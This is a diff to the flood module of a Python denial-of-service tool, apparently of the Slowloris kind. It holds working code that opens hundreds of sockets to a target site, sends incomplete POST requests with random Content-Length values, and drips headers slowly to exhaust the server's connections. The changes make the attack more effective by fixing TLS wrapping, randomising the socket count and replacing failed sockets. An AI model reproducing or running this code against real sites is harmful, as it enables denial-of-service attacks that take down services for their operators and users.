@@ -38,14 +38,14 @@ def open_socket() -> socket.socket | None: # opens a new socket, and returns it
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
 
+    if Core.target_port == 443:
+        sock = ssl.create_default_context().wrap_socket(
+            sock=sock,
+            server_hostname=Core.target_host
+        )
+
     try:
         sock.connect((Core.target_host, Core.target_port)) # connect
-
-        if Core.target_port == 443:
-            sock = ssl.create_default_context().wrap_socket(
-                sock=sock,
-                server_hostname=Core.target_host
-            )
     except Exception:
         return None
 
@@ -56,18 +56,25 @@ def flood(attack_id, url, stoptime) -> None:
     if not Core.target_host: Core.target_host = urlparse(url).hostname # set host if not already set
     if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else (80 if urlparse(url).scheme == 'http' else 443) # set port if not already set
 
+
+    max_socks = randint(100, 400)
+
     if Core.sockets == []:
-        for _ in range(200):
+        for _ in range(max_socks):
             sock = open_socket()
 
             if sock:
-                sock.send(f"GET /{utils().buildblock('/', include=False)} HTTP/{Core.http_proto_ver}\r\nContent-Length: {str(randint(10000, 20000))}\r\n".encode())
-
-                for header in utils().buildheaders(url, if_socket=True):
-                    sock.send(f"{header}\r\n".encode())
+                payload = (
+                    f'POST /{utils().buildblock("/", include=False)} HTTP/{Core.http_proto_ver}\r\n'
+                    + f'Host: {Core.target_host}\r\n'
+                    + f'Content-Length: {str(randint(1, 20000))}\r\n'
+                    + str(utils().buildheaders(url, if_socket=True))
+                )
 
                 Core.sockets.append(sock)
                 Core.infodict[attack_id]['conn_opened'] += 1 # count a new connection
+
+                sock.send(payload.encode())
 
     while time.time() < stoptime and not Core.killattack:
         if not Core.attackrunning:
@@ -80,11 +87,12 @@ def flood(attack_id, url, stoptime) -> None:
                 Core.infodict[attack_id]['req_sent'] += 1
             except Exception:
                 Core.infodict[attack_id]['req_fail'] += 1
+                Core.sockets.remove(sock)
             
             Core.infodict[attack_id]['req_total'] += 1
             time.sleep(uniform(3,10))
         
-        for _ in range(200-len(Core.sockets)): # open new sockets to fill the list again
+        for _ in range(max_socks-len(Core.sockets)): # open new sockets to fill the list again
             sock = open_socket()
 
             if sock:
@@ -92,7 +100,8 @@ def flood(attack_id, url, stoptime) -> None:
                 Core.infodict[attack_id]['conn_opened'] += 1
     
     for sock in Core.sockets: # cleanup
-        sock.close()
+        if sock:
+            sock.close()
 
     Core.threadcount -= 1
 
